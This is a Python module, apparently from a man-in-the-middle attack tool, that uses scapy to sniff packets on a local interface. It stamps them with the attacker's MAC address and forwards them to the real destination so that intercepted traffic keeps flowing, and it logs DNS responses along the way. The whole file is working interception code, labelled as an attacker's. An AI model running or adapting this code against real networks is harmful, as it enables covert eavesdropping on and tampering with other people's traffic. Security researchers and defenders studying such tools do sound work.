# Standard libraries
from threading import Lock

# Additional libraries
from scapy.arch import get_if_hwaddr, get_if_addr
from scapy.layers.dns import DNS
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sniff

# Local libraries
from src.tools import get_mac_by_ip


def forward(interface: str, settings: dict):
    print('Forwarding intercepted packets on ' + interface)
    hosts_dictionary: dict = settings['hosts'][interface]
    lock: Lock = settings['locks'][interface]
    attacker_mac = get_if_hwaddr(interface)
    attacker_ip = get_if_addr(interface)

    def send_forward(received_packet):
        received_packet[Ether].src = attacker_mac
        lock.acquire()
        received_packet[Ether].dst = get_mac_by_ip(received_packet[IP].dst, hosts_dictionary)
        lock.release()
        sendp(received_packet, interface=interface, verbose=settings['show debug'])

    def check_forward(received_packet):
        if received_packet[IP].dst == attacker_ip or received_packet[Ether].dst != attacker_mac:
            return
        if DNS in received_packet:
            if received_packet[DNS].opcode == 0 and received_packet[DNS].ancount > 0:
                if received_packet[Ether].src != attacker_mac:
                    if settings['show selective forward block']:
                        print('Forwarded package from ' + received_packet[IP].src + ' to ' + received_packet[IP].dst)
        send_forward(received_packet)

    while not settings['interrupted']:
        sniff(iface=interface, prn=check_forward, filter='ip', store=0)